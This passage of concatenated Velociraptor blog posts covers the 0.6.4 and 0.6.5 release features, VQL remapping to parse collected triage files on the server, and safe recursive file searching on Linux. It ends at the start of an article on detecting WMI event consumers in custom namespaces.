for a discussion of these limits.

### The offline collector resource controls

Many people use the [Velociraptor offline collector]({{< ref
"/docs/offline_triage/#offline-collections" >}}) to collect artifacts
from endpoints which they are unable to install a proper client/server
architecture on. In previous versions there was no resource control or
time limits imposed on the offline collector because it was assumed
that it would be used interactively by a user.

However experience shows that many users use automated tools to push
the offline collector to the endpoint (e.g. an EDR or another endpoint
agent) and therefore it would be useful to provide resource controls
and timeouts to control Velociraptor acquisitions. The below
screenshot shows the new resource control page in the offline
collector wizard.

![Configuring offline collector resource controls](offline_collector_resources.png)

## GUI Changes

Versions 0.6.4 brings a lot of useful GUI improvements.

### Notebook suggestions

Notebooks are an excellent tool for post processing and analyzing the
collected results from various artifacts. Most of the time similar
post processing queries are used for the same artifacts so it makes
sense to allow notebook `templates` to be defined in the artifact
definition. In this release you can define an optional `suggestion` in
the artifact yaml to allow a user to include certain cells when
needed.

The following screenshot shows the default suggestion for all hunt
notebooks: `Hunt Progress`. This cell queries all clients in a hunt
and shows the ones with errors, running and completed.

![Hunt notebooks offer a hunt status cell](hunt_suggestions.png)

![Hunt notebooks offer a hunt status cell](hunt_suggestions_2.png)


### Multiple OAuth2 authenticators

Velociraptor has always had SSO support to allow strong 2 factor
authentication for access to the GUI. However, previously Velociraptor
only supported one OAuth2 provider at a time. Users had to choose
between Google, Github, Azure or OIDC (e.g. Okta) for the
authentication provider.

This limitation is problematic for some organizations who need to
share access to the Velociraptor console outside their own
organizations (e.g. consultants need to provide read only access to
customers).

In 0.6.4 Velociraptor can be configured to support multiple SSO
providers at the same time. So an organization can provide access
through Okta for their own org at the same time as Azure or Google for
their customers.

![The Velociraptor login screen supports multiple providers](multiple_oauth2.png)

## The Velociraptor knowledge base

Velociraptor is a very powerful tool. It's flexibility means that it
can do things that you might have never realized it can! For a while
now we have been thinking about ways to make this knowledge more
discoverable and easily available.

Many people ask questions on the Discord channel and learn new
capabilities in Velociraptor. We want to try a similar format to help
people discover what Velociraptor can do.

The [Velociraptor knowledge base]({{< ref "/knowledge_base/" >}}) is a
new area on the documentation site that allows anyone to submit small
(1-2 paragraphs) tip about how to do a particular task. Knowledge base
tips are phrased as questions to help people search for them. Tips
should be short and refer to more detailed documentation - they are
just a quick hint.

If you learned something about Velociraptor that you did not know
before and would like to share your experience to make the next user's
journey that little bit easier, please contribute a small note to the
knowledge base.

## Known issues

Updating the VQL path handling in 0.6.4 introduces a new column called
`OSPath` (replacing the old `FullPath` column) which was not present
in previous versions. While we attempt to ensure that older artifacts
should continue to work on 0.6.4 clients, it is likely that the new
VQL artifacts built into 0.6.4 will not work correctly on older
versions.

If you are upgrading the Velociraptor server but still have older
clients in the field, it is likely that collecting the built in
artifacts will fail due to the new features not being present in older
clients.

To make migration easier, 0.6.4 comes built in with the
`Server.Import.PreviousReleases` artifact. This server artifact will
load all the artifacts from a previous release into the server. You
can use those older versions with older clients.

![Importing previous versions of core artifacts](importing_previous_versions.png)

## Conclusions

If you like the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is a available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2022/2022-06-21-release-notes/_index.md
======
---
title: "Velociraptor 0.6.5 Release"
description: |
   Velociraptor Release 0.6.5 is now LIVE. This post discusses some of the new features.
tags:
 - Release
author: "Mike Cohen"
date: 2022-06-21
---

I am very excited to announce the latest Velociraptor release
0.6.5. This release has been in the making for a few months now and
has a lot of new features.

In this post I will discuss some of the interesting new features.

## Table transformations

Velociraptor collections or hunts are usually post processed or
filtered in `Notebooks`. This allows users to refine and post process
the data in complex ways. For example, to view only the Velociraptor
service from a hunt collecting all services
(`Windows.System.Services`), one would click on the Notebook tab and
modify the query by adding a `WHERE` statement.

![Filtering rows with VQL](vql_filter.png)

In our experience this type of quickly filtering/sorting a table is
very common and sometimes we dont really need the full power of
VQL. In 0.6.5 we introduced `table transformations` - simple
filtering/sorting operations on every table in the GUI.

![Transform any table in the GUI](transform_table1.png)

We can now select simple table transformations like filtering or
sorting. The GUI will automatically generate the required query.

![Setting simple table transformations](transform_table2.png)


## Multi-Lingual support

Velociraptor's community of DFIR professionals is global! We have
users from all over the world and although most users are fluent in
English, we wanted to acknowledge our truly international user base by
adding internationalization into the GUI. You can now select from a
number of popular languages (Don't see your language here? We would
love additional contributions!).

![Select from a number of popular languages](language.png)

Here is a screenshot showing our German translations

![The Velociraptor interface in German](de.png)

## New interface themes

The 0.6.5 release expanded our previous offering of 3 themes into 7
themes with a selection of light and dark themes. We even have a retro
feel `ncurses` theme that looks like a familiar terminal...

![A stunning retro `ncurses` theme](ncurses.png)

## Error handling in VQL

Velociraptor is simply a VQL engine; Users write VQL artifacts and run
these queries on the endpoint.

Previously it was difficult to tell when VQL encountered an
error. Sometimes a missing file is expected, and other times it means
something went wrong. From Velociraptor's point of view, as long as
the VQL query ran successfully on the endpoint the collection was a
success. The VQL query can generate logs to provide more information
but the user had to actually look at the logs to determine if there
was a problem.

For example, in a hunt parsing a file on the endpoints, it was
difficult to tell which of the thousands of machines failed to parse a
file. Previously, Velociraptor marked the collection as successful if
the VQL query ran - even if it returned no rows because the file
failed to parse.

In 0.6.5 there is a mechanism for VQL authors to convey more nuanced
information to the user by way of error levels. The VQL `log()`
function was expanded to take a `level` parameter. When the level is
`ERROR` the collection will be marked as failed in the GUI.

![A failed VQL query](fail.png)

![Query Log messages have their own log level](fail_log.png)

## Custom Timezone support

Timestamps are a central part of most DFIR work. Although it is best
practice to always work in UTC times it is sometimes a real pain to
have to convert from UTC to local time in one's head! Since
Velociraptor always uses
[RFC3389](https://datatracker.ietf.org/doc/html/rfc3339) to represent
times unambiguously but for human consumption it is convenient to
represent these times in different local times.

You can now select a more convenient timezone in the GUI by clicking
your user preferences and setting the relevant timezone.

![Selecting a custom timezone](timezone_selection.png)

The preferred time will be shown in most times in the UI
![Timezone selection influences how times are shown](timezone_vfs.png)

## A new MUSL build target

On Linux Go binaries are mostly static but always link to `Glibc`
which is shipped with the Linux distribution. This means that
traditionally Velociraptor had problems running on very old Linux
machines (previous to Ubuntu 18.04). We used to build a more
compatible version on an old Centos VM but this was manual and did not
support the latest Go compiler.

In 0.6.5 we added a new build target using
[MUSL](https://www.musl-libc.org/) - a light weight `Glibc`
replacement. The produced binary is completely static and should run
on a much wider range of Linux versions. This is still considered
experimental but should improve the experience on older Linux
machines.

## Conclusions

If you like the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is a available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2022/2022-08-04-post-processing/_index.md
======
---
title: "Postprocessing Collections"
description: |
   Sometimes we have a need to post process a collection on the server. This blog post covers this use case and possible approaches.
tags:
 - Notebook
 - Forensics
author: "Mike Cohen"
date: 2022-08-03
---

Traditionally the digital forensic process consists of several distinct phases:

1. The *collection* or *acquisition* phase consists of collecting as much
   evidence as possible from the endpoint.
2. Once data is collected, the data is *parsed and analyzed* on a
   different system, to make inferences about the case.

Traditionally, the acquisition phases consists of a bit for bit copy
of the disk and memory. However in modern DFIR investigations, this is
just not practical due to the large volumes of data involved.

Modern DFIR investigations use a triaging approach, where selected
high value files are collected from the endpoint (For example
[Kape](https://www.kroll.com/en/insights/publications/cyber/kroll-artifact-parser-extractor-kape)
is a commonly used Triaging tool for collecting files).

Typically triage collections consist of collecting event log files,
the $MFT, the USN Journal, registry hives etc.

Once files are collected, they are typically parsed using various
parsers and single purpose tools. Traditionally using tools such as
`Plaso`, Eric Zimmerman's tools and various specialized scripts.

{{% notice note "The KapeFiles project" %}}

In the following discussion we refer to the
`Windows.KapeFiles.Targets` artifact. This artifact is not related to
the commercial `Kape` product. The artifact is generated from the open
source [KapeFiles](https://github.com/EricZimmerman/KapeFiles) project
on github - an effort to document the path location of many bulk file
evidence sources.

{{% /notice %}}

## The Velociraptor approach to triage

Velociraptor is a one stop shop for all DFIR needs. It already
includes all the common parsers (e.g. NTFS artifacts, EVTX, LNK,
prefetch parsers and many more) on the endpoint itself. All this
capability is made available via `VQL artifacts` - simple YAML files
containing VQL queries that can be used to perform the parsing
directly on the endpoint.

New Velociraptor users tend to bring the traditional DFIR approach to
a distributed setting. Newer users prefer to use the
`Windows.KapeFiles.Targets` artifact to collect those same files that
are traditionally collected for triage using Velociraptor. Files such
as event logs, $MFT, prefetch etc are collected from the endpoint to
the server (sometimes consisting of a few GB of data).

But now there is a common problem - how to post process these raw
files to extract relevant information?

New users simply export the raw files from Velociraptor and then
use the traditional single use tools on the raw files. However, can we
use Velociraptor itself to parse these raw files on the server?

This blog post is about this use case: How can we apply Velociraptor's
powerful parsing and analysis capabilities to the collected bulk data
from the `Windows.KapeFiles.Targets` artifact?

## Collecting bulk files with Windows.KapeFiles.Targets

In this example I will perform a `KapeFiles` collection on my
system. I have selected the `BasicCollection` as a reasonable trade
off between collecting too much data but providing important files
such as event logs, registry hives and the $MFT.

![Collecting KapeFiles targets](kapefiles_collection.png)

Once the collection is complete, the collection has transferred about
600mb of data in a couple of minutes.

![Collecting KapeFiles results](kapefiles_collection_overview.png)

The `Windows.KapeFiles.Targets` artifact is purely a collection
artifact - it does not parse or analyze any files on the endpoint,
instead it simply collects the bulk data to the server. All the files
that were transferred are visible in the `Uploaded Files` tab.

![Collecting KapeFiles Uploads](kapefiles_collection_uploads.png)

### Postprocessing downloaded files

Our first example is to parse the prefetch files with the
`Windows.Timeline.Prefetch` artifact.

Since Velociraptor's data store is just a directory on disk it is easy
to just read the files. We can simply provide the artifact with the
relevant path on disk to search for prefetch files and parse them.

I will click on the `Notebook` Tab to start a new notebook and enter
the following VQL in a cell (My test system uses `F:/tmp/3/` as the
filestore).

```vql
LET FilePath = "F:/tmp/3/orgs/OHBHG/clients/C.dc736eeefcc58a6c-OHBHG/collections/F.CBJH2GD2ULRAQ/uploads"

SELECT * FROM Artifact.Windows.Timeline.Prefetch(prefetchGlobs=FilePath+"/**/*.pf")
```

Here the path on disk where the collection results are stored contain
the `ClientID` and `FlowID` (In this case there is also an Org
ID). Generally this path pattern will work for all collections.

The VQL then simply calls the artifact `Windows.Timeline.Prefetch`
with the relevant glob allowing it to search for prefetch files on the
server.

{{% notice note "Notebooks queries" %}}

Notebooks contain cells which help the user to evaluate VQL queries
**on the server**. Remember that notebook queries always run on the
server and not on the original client. This post-processing query will
parse the prefetch files on the server itself.

{{% /notice %}}

![Simple parsing of server collected files](simple_postprocessing.png)

There are a number of disadvantages with this approach:

1. Since the files are parsed on the server, the results will contain
   the full path to the server files (including the client id, flow id
   and org id).
2. For this to work well we need to really understand how the artifact
   works - some artifacts accept a list of globs that allow them to
   find certain files in non standard locations. These parameters will
   be named differently in different artifacts and might not even
   provide that level of customization.
3. Some artifacts perform more complex operations, like enriching with
   WMI queries or other API calls. Because this query is running on
   the server it may mix server side information with the client side
   information causing confusing results.

The main difficulty is that artifacts are typically written with the
expectation that they will be running on the endpoint. Some artifacts
search for files in certain locations and may not provide the
customization to be able to run on the server.

### Remapping accessors

In recent versions of Velociraptor, a feature called `remapping` was
introduced. The original purpose of remapping was to allow
Velociraptor to be used on a dead disk image, but the feature had
proved to be more widely useful.

Velociraptor provides access to files using an `accessor`. An accessor
can be thought of as simply a driver that presents a filesystem to the
various plugins within VQL. For example, the `registry` accessor
presents the registry as a filesystem, so we can apply `glob()` to
search the registry, `yara()` to scan registry values etc.

Remapping is simply a mechanism where we can substitute one accessor
for another. Let's apply a remapping so we can run the
`Windows.Timeline.Prefetch` artifact with default parameters.

```vql
LET _ <= remap(clear=TRUE, config=regex_transform(source='''
    remappings:
      - type: mount
        from:
          accessor: fs
          prefix: "/clients/ClientId/collections/FlowId/uploads/auto/"
        on:
          accessor: auto
          prefix: ""
          path_type: windows
''', map=dict(FlowId=FlowId, ClientId=ClientId)))

SELECT * FROM Artifact.Windows.Timeline.Prefetch()
```

The above VQL builds a remapping configuration by substituting the
`ClientId` and `FlowId` into a template (this relies on the fact that
Flow Notebooks are pre-populated with `ClientId` and `FlowId`
variables).

The remapping configuration performs a `mount` operation from the file
store accessor rooted at the collection's upload directory onto the root
of the `auto` accessor. In other words, whenever subsequent VQL
attempts to open a file using the `auto` accessor, Velociraptor will
remap that to the file store accessor rooted at the collection's top
level. Because the `Windows.KapeFiles.Targets` artifact preserves the
filesystem structure of collected files, the artifact should be able to
find the files on the server in the same location they are found on
the endpoint.

This allows us to just call the artifact directly without worrying
about customizing it specifically. This approach is conceptually
similar to building a virtual environment that emulates the endpoint
but using files found on the server.

![Parsing of server collected files using a remapping](remapping_postprocessing.png)

### Remapping the NTFS accessor

Let's now try to parse the $MFT with the `Windows.NTFS.MFT` artifact.

![Parsing of $MFT on the server](remapping_postprocessing_ntfs.png)

This does not work because the server does not have the `ntfs`
accessor! The `Windows.NTFS.MFT` artifact will try to open the $MFT
from the default path `C:\$MFT` using the `ntfs` accessor because this
is how we normally access the $MFT file on the endpoint. But on the
server we want to open the collected `$MFT` file using the
filestore. We will have to add another mapping for that!

```vql
LET _ <= remap(clear=TRUE, config=regex_transform(source='''
    remappings:
      - type: mount
        from:
          accessor: fs
          prefix: "/clients/ClientId/collections/FlowId/uploads/ntfs/"
        on:
          accessor: ntfs
          prefix: ""
          path_type: ntfs

''', map=dict(FlowId=FlowId, ClientId=ClientId)))

SELECT * FROM Artifact.Windows.NTFS.MFT()
```

This maps the `ntfs` branch of the collection upload to the `ntfs`
accessor. Now when the VQL opens files with the `ntfs` accessor it
will actually be fetched from the server's filestore.

![Parsing of $MFT on the server with filestore remapping](remapping_ntfs.png)

### Registry mapping

For our last example, we wish to see the list of installed programs on
the system by collecting the `Windows.Sys.Programs` artifact. That
artifact simply enumerates the keys under
`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`. To
make this work we need to mount a virtual SOFTWARE registry hive in
such a way that when the artifact accesses that key, the internal raw
registry parser will be used to retrieve those values.

```vql

LET _ <= remap(clear=TRUE, config=regex_transform(source='''
    remappings:
        - type: mount
          from:
            accessor: raw_reg
            prefix: |-
              {
                "Path": "/",
                "DelegateAccessor": "fs",
                "DelegatePath": "/clients/ClientId/collections/FlowId/uploads/auto/C:/Windows/System32/config/SOFTWARE"
              }
            path_type: registry
          "on":
            accessor: registry
            prefix: HKEY_LOCAL_MACHINE\Software
            path_type: registry
''', map=dict(FlowId=FlowId, ClientId=ClientId)))

SELECT * FROM Artifact.Windows.Sys.Programs()
```

The above directive instructs Velociraptor to use the `raw_reg`
accessor to parse the file on the server, and mounts it under the
`HKEY_LOCAL_MACHINE\Software` key in the registry accessor.

![Parsing of raw registry hives](remapping_registry.png)

A similar approach can be used to mount each user hive under
`/HKEY_USERS/`

### Automating the remapping

The technique shown above can be extended to support multiple
artifacts but it is tedious to write by hand. Luckily there is an
artifact on the `Artifact Exchange` called
`Windows.KapeFiles.Remapping` to automate the remapping construction:

1. Remap standard registry hives e.g. `HKEY_LOCAL_MACHINE/Software`
2. Remap user hives on `HKEY_USERS/<Username>`
3. Mount ntfs and auto accessors
4. Disable plugins which can not work on files (e.g. `pslist`, `wmi` etc)

The result is easy to use. In the below I unpack the Scheduled Tasks:

```vql
LET _ <=
 SELECT * FROM Artifact.Windows.KapeFiles.Remapping(ClientId=ClientId, FlowId=FlowId)

 SELECT * FROM Artifact.Windows.System.TaskScheduler()
```

![Automating the remapping steps](automatic_remapping_1.png)

I can seamlessly use the EVTX hunter artifact


![Searching for event IDs from collected EVTX files](automatic_remapping_2.png)


### Conclusions

In the previous section we saw how it is possible to post process
collected files on the server by reusing the standard Velociraptor
artifacts (that were written assuming they are running on the
endpoint).

Is that a good idea though?

Generally we do not recommend to use this methodology. Although it is
commonly done in other tools, collecting bulk files from the endpoint
and then parsing them offline is not an ideal method for a number of
reasons:

* It does not scale - typically a `Windows.KapeFiles.Targets` collects
  several Gigabytes of data. While this is acceptable for a small
  number of hosts, it is impractical to collect that much data from
  several thousand endpoints. Therefore effective hunting requires
  parsing the files directly on the endpoint.

* Bulk files from the endpoint are a limited source of data - there is
  a lot more information that reflects the endpoint's state. From WMI
  queries, process memory captures, ARP caches etc.

* It is always difficult to guess exactly which files will be
  required. In a `Windows.KapeFiles.Targets` collection, we need to
  select the appropriate targets to collect. Collecting too much is
  impractical and collecting too little might miss some important
  information.

  For example consider the following artifact `Exchange.HashRunKeys` -
  an artifact that displays programs launched from `Run` keys together
  with their hashes. Because it is impossible to know prior to
  collection which binaries are launched from the `Run` keys, usually
  the triage capture does not acquires these binaries. When we parse
  the registry hives on the server, we are missing the actual hashes:

![Mapping to the triage bundle may miss crucial details](hash_key.png)

However collecting the artifact on the endpoint works much better.

![Collecting directly on the endpoint works much better](live_hashes.png)

* Parsing certain artifacts on the server is impossible to do. For
  example, the above EVTX hunter enriches the SID in the event by
  calling the `lookupSID()` VQL function (that calls the Windows
  API). Clearly this can not work on the server. Similarly [resolving
  the event messages]({{% ref  "/blog/2019/2019-11-12_windows-event-logs-d8d8e615c9ca/" %}}) is also
  problematic when parsing the event logs offline.

Rather than collecting bulk data using `Windows.KapeFiles.Targets`,
Velociraptor users should collect other, more capable artifacts, that
parse information directly on the endpoint (even if it is **in
addition** to `Windows.KapeFiles.Targets`). As the investigation
progresses, more artifacts can be collected as needed. We treat the
endpoint as the ultimate source of truth and simply query it
repeatedly.

The traditional collect, transfer, analyze workflow was born from an
era when forensic tools were less capable and could not run directly
on the endpoint. Investigators had a one shot window for acquiring as
much data as possible, hoping they don't need to go back and fetch
more.

With the emergence of powerful, and always connected, DFIR tools like
Velociraptor, we can bring the analysis capabilities directly to the
endpoint. Because analysis is so fast now, one can quickly go back to
the endpoint and get further information iteratively.

If you like the remapping feature, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is a available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2022/2022-01-05-searching-for-files-on-linux/_index.md
======
---
title: "Searching for files"
description: |
    A common technique in DFIR is simply searching the filesystem for files. While this seems like a simple task, there are some surprising traps. This article covers some of the issues and possible solutions.

tags:
 - VQL
 - Linux
 - Searching

author: "Mike Cohen"
date: 2022-01-05
---

{{% notice tip %}}

This article discusses new features appearing in Velociraptor's 0.6.3
release. Earlier releases may not have the same features.

{{% /notice %}}

Many DFIR tasks involve simply searching the filesystem for certain
files. In Velociraptor this capability is available through the
`glob()` plugin, that uses a glob expressions (containing wild cards)
to search the filesystem. Additional VQL plugins can be used to
further filter and process the results.

This capability is also available in many other tools, for example,
the `find` native Linux command allows searching the filesystem, and
most programming languages have similar features. For example in
Python the
[`os.walk`](https://docs.python.org/3/library/os.html#os.walk) method,
or in Golang the
[filepath.Walk](https://pkg.go.dev/path/filepath#Walk) method. The
following discussion applies equally to all methods and is also
relevant for single use scripts.

## The Log4j vulnerability

The Log4j vulnerability has been published in December 2021. Due to
the high severity and ease of exploitation many blue teamers scrambled
to identify the presence of vulnerable software on servers. A myriad
of scripts and single use tools were published that could search the
filesystem for vulnerable jar files (e.g. `find` based scripts
[`yahoo/check-log4j`](https://github.com/yahoo/check-log4j),
[`rubo77/log4j_checker_beta`](https://github.com/rubo77/log4j_checker_beta),
Go based
[`palantir/log4j-sniffer`](https://github.com/palantir/log4j-sniffer) ).

I wanted to share some of the potential pitfalls that one may
encounter searching the filesystem in the real world. In particular
some of these issues may present performance problems so should be
kept in mind when writing custom one off scripts, or new Velociraptor
artifacts.

## Following Symlinks

A symbolic link is a special type of filesystem object which points at
another file or directory. When walking the files in a directory, one
needs to decide if to follow the symbolic link or not.

If one follows the symbolic link and recurse into a directory which a
link points to, there is a danger that the link points back to a
higher place in the directory tree, leading to a symbolic link cycle.

A program that blindly follows links may become trapped in a symbolic
link cycle. This is particularly problematic when recursing through
the `/proc` filesystem, which contains links to / (e.g. a process's
working directory).

For example the below snippet can be seen with find, when instructed
to follow symbolic links:

```sh
# find -L /proc
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/memstick/realtek
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/memstick/realtek/usb.h
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/memstick/realtek/pci.h
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/hid.h
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/alim7101
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/alim7101/wdt.h
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/snd.h
```

Such a program will never complete because each item in proc will cause
`find` to recurse through the entire filesystem until recursively
entering `/proc` again!

This is particularly dangerous when running this program remotely
using a tool that has no ability to constrain the time, CPU usage or
returned rows of external programs. This can lead to huge CPU
consumption on the target system and spinning out of control programs.

This is probably the reason why `find`'s default behavior is to
**not** follow symbolic links. However if not following symbolic links
it is possible to miss important files (for example many servers
contain symlinks to data drives so starting a find from `/var/www`
might miss files).

Velociraptor's `glob()` plugin does follow links by default, but keeps
track of visited inodes in order to detect cycles. This can still lead
to unintended loops especially when recursing through the `/proc`
filesystem.

## Remote filesystems

Many servers have distributed filesystems mounted at various points in
the filesystem. Running a large recursive search may recurse into
these remote filesystems which may be absolutely huge. Recursing into
these remote files can also lead to very long network delays
essentially preventing the search from completing at all!

It is difficult to predict in advance where remote filesystems are
mounted - especially when running a search on an unknown server. (This
situation is also present when mounting a filesystem over `fuse` for
example, a vmware shared folder).

The `find` command has a `-xdev` option that restricts searching to a
single filesystem. This flag ensures that `find` does not recurse into
remote mounted filesystems. As an added bonus `-xdev` also prevents
recursing into the `/proc` filesystem (which can be problematic as
described above)

Unfortunately many Unix systems have separate partitions for `/home`,
`/usr` or `/boot` and so preventing recursion into other filesystems
can prevent finding files in those partitions.

{{% notice note "Bind mounts" %}}

In Linux it is possible to create a `bind` mount using the `--bind`
flag to mount another directory again inside a mount point
directory. This is similar to a symlink in the sense that it may point
further up the directory tree creating extra work for the `find`
command.

For example:

```
# mkdir /root/bount
# mount --bind / /root/bound/
# find /root/
...
/root/bound/usr/i686-w64-mingw32/lib/libcabinet.a
/root/bound/usr/i686-w64-mingw32/lib/binmode.o
find: File system loop detected; ‘/root/bound/root’ is part of the same file system loop as ‘/root/’.
```

The `find` command is able to detect these kinds of filesystem loops
and not get trapped but a custom program may not.

{{% /notice %}}

# The glob plugin

Velociraptor's `glob()` plugin is the usual way that file searching is
implemented. Conceptually it is simple, to use - just provide a
wildcard expression and the glob plugin returns all the files that
match it. For example, one might be tempted to run the following query
looking for files with the `.pem` extension:

```vql
SELECT FullPath
FROM glob(globs="/**/*.pem")
```

On Linux such a query might encounter some problems! The `glob()`
plugin by default follows symlinks and as soon as the glob plugin
enters the `/proc` directory the plugin will likely encounter a
symlink further up the filesystem (usually back to /) and continue
recursing through that.

![Recursing through the /proc filesystem](glob_proc.png)

We can disable following symlinks using the nosymlink option to
glob. However this query will also take a very long time on this
system:

![Recursing into a network mount](glob_network.png)

This test system has a large remote filesystem mounted on `/shared/`
so any recursion into that directory will be very slow.

## Excluding recursion into certain directories

Supposed that in this case we don't really care about remote
filesystems, we just want to search for pem files in the local
system. We know that certain directories should be excluded so we
might be tempted to write a query like:

```vql
SELECT FullPath
FROM glob(globs="/**/*.pem")
WHERE NOT FullPath =~ "^/(proc|shared)"
```

This query uses a WHERE clause to filter out any paths starting with
`/proc` or `/shared`. While this seems reasonable it does not work!
Thinking back to how VQL works (See [Life of a Query]({{< ref
"/docs/vql/#life-of-a-query" >}}) ), the `glob()` plugin will expand
the full glob into the query, and the WHERE clause simply filters out
non-matching rows. Therefore `glob()` will still get stuck in proc or
shared as before!

We need a way to tell the glob plugin itself **not** to recurse into
certain directories at all to save the unnecessary work. Since 0.6.3
the `glob()` plugin can accept a `recursion_callback` argument. This
is a VQL lambda function that receives the full row and return a
boolean to decide if the directory should be recursed into. If the
lambda returns FALSE, the glob plugin does not bother to enter the
directory at all, therefore saving a lot of effort.

![Controlling recursion in the glob plugin](glob_recursion_callback.png)

In the above example, we used the VQL lambda returning true only for directories that have a path not starting with `shared` or `proc` or `snap`:

```vql
x => NOT x.FullPath =~ '^/(shared|proc|snap)'
```

## More powerful recursion callbacks

While controlling recursion using the directory path works well on
this system, we typically want to develop a more generalized solution
that we can apply to more systems. Ultimately, we can not predict
where various filesystems are mounted based on the path, but we just
want to ensure that we do not recurse into remote filesystems, or
virtual filesystems.

The `recursion_callback` mechanism is very flexible and allows us to
choose arbitrary conditions to control the recursion. Can we determine
what type of filesystem a particular file resides on?

On Linux, the `stat` filesystem call returns a `device` field. You can see
this with a simple stat shell command:

```bash
# stat /etc/passwd
   File: /etc/passwd
   Size: 2292            Blocks: 8          IO Block: 4096   regular file
Device: fd00h/64768d    Inode: 540077      Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2022-01-06 22:08:44.793600319 +1000
Modify: 2021-12-09 17:19:40.768596398 +1000
Change: 2021-12-09 17:19:40.768596398 +1000
 Birth: 2021-12-09 17:19:40.768596398 +1000
```

The `Device` field is actually broken into two parts - the device
major part and the device minor part (8 bits each). These correspond
to the device shown in `/dev/` (`fd00` represents major `0xfd` (253)
and minor 0):

```bash
# ls -l /dev/dm-0
brw-rw-r-- 1 root disk 253, 0 Jan  6 01:55 /dev/dm-0
```

The device major number represents the device driver that is
responsible for this filesystem, listed in `/proc/devices`:

```
Block devices:
  7 loop
  8 sd
  9 md
 11 sr
 65 sd
 66 sd
 67 sd
 68 sd
 69 sd
 70 sd
 71 sd
128 sd
129 sd
130 sd
131 sd
132 sd
133 sd
134 sd
135 sd
253 device-mapper
254 mdp
259 blkext
```

The glob plugin can provide filesystem specific information in the
`Data` column:

![Device major and minor numbers](device_major.png)

Major numbers larger than 7 are considered "local". The following
query can therefore stay on the locally attached devices excluding the
loopback mounted filesystems:

```vql
SELECT FullPath
FROM glob(globs='/**/*.pem',
          recursion_callback='x=>x.IsLink OR x.Data.DevMajor > 7')
```

This query is very efficient, following links but skipping /proc,
remote filesystems but covering additional attached storage. We do not
need to rely on guessing where remote filesystems are mounted, and
excluding only those directories, instead limiting recursion to the
type of device hosting the filesystem.

# Conclusions

Searching files on the filesystems seems like a simple operation, but
can represent a number of pitfalls - particularly when run against
Linux system with unusual configuration. Not considering these issues
may result in runaway processes and severe load on the target systems.

It is difficult to predict how much work a recursive search will
perform so tools should have safety built in, such as timeouts
(Velociraptor's default 600 second timeout will cancel the search),
limits on number of rows returned or directory traversal depth
limitation (Velociraptor's glob expressions can specify a recursion
depth).

The `find` commandline tool has some safety mechanisms built in such
as cycle detection, in addition to the `-xdev` option limiting
recursion to a single filesystem. Any custom code needs to replicate
these mechanisms.

Velociraptor's `glob()` plugin has fine grained controls allowing
coverage of only a small set of filesystem types, or mount
points. This allows Velociraptor to safely search the entire system
for files balancing coverage with the risk following symlinks.

---END OF FILE---

======
FILE: /content/blog/2022/2022-01-12-wmi-eventing/_index.md
======
---
title: "WMI Event Consumers: what are you missing?"
description: |
    WMI Eventing is a fairly well known technique in DFIR however
    some tools may not provide the coverage you expect. This
    article covers WMI and specifically detection in less familiar
    custom namespaces.

tags:
 - WMI
 - Detection
 - VQL
 - ASEP
 - ETW
 - T1546.003

author: "Matt Green - @mgreen27"
date: 2022-01-12
---

WMI Eventing is a fairly well known technique in DFIR, however some
tools may not provide the coverage you expect. This article covers
WMI eventing visibility and detection including custom namespaces.

![Selection bias in WWII: missing what is not collected.](00SelectionBias.png)

## Background

There has been a fair bit of research and observations of WMI eventing
in field over the last years. In short, a WMI event consumer is a
method of subscribing to certain system events, then enabling an action
of some sort. Common adversary use cases may include persistence, privilege
escalation, or as a collection trigger. Represented as ATT&CK T1546.003
this technique has been observed in use from APT, through to trash-tic
worm and coin miner threats.

![WMI Eventing: 3 system classes](01WMIOverview.png)

There are three system classes in every active event consumer:

1. \_\_EventFilter is a WQL query that outlines the trigger event of
interest.
2. \_\_EventConsumer is an action to perform upon triggering an event.
3. \_\_FilterToConsumerBinding is the registration mechanism that binds
a filter to a consumer.

Most detection will focus on collecting the WMI classes in root/subscription
and, in some tools root/default WMI namespaces.

![Autoruns 14.07: detects root/default and root/subscription namespace WMI event consumers](02Autoruns.png)


#### Custom Namespaces

At Blackhat 2018 Lee Christensen and Matt Graeber presented "Subverting
Sysmon: Application of a Formalized Security Product Evasion Methodology".
This excellent talk focused on defense evasion methodology and highlighted
potential collection gaps in telemetry tools around WMI eventing. In this
case, the focus was on Sysmon behaviour of collection only in
root/subscription, interestingly, it also highlighted the possibility to
implement \_\_EventConsumer classes in arbitrary namespaces.

It is detection of WMI Event Consumers in arbitrary namespaces that I'm going
to focus. For anyone interested in testing I have written
[a script to generate WMI event consumers](https://github.com/mgreen27/mgreen27.github.io/blob/master/static/other/WMIEventingNoisemaker/WmiEventingNoisemaker.ps1).
This script wraps several powershell functions released during the Black
Hat talk to test creating working event consumers.

First step was to create a custom namespace event consumer. In this
instance I selected the namespace name `totallylegit` and attached an
ActiveScript event consumer.

